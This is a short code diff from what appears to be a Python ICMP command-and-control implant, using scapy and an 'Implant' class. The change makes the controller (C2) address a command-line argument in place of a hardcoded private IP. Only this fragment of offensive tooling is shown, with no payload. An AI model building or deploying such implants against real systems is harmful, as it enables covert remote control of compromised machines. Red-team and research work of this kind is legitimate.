@@ -9,12 +9,13 @@ from scapy.all import sniff
 from lib.shlib import Host
 from subprocess import STDOUT, check_output, TimeoutExpired
 import os
+import sys
 
 ICMP_ID = int(12800)
 TTL = int(64)
 
 # Set IP of the C2 here
-controller_ip = "192.168.157.6"
+controller_ip = sys.argv[1]
 
 class Implant(Host):
     """
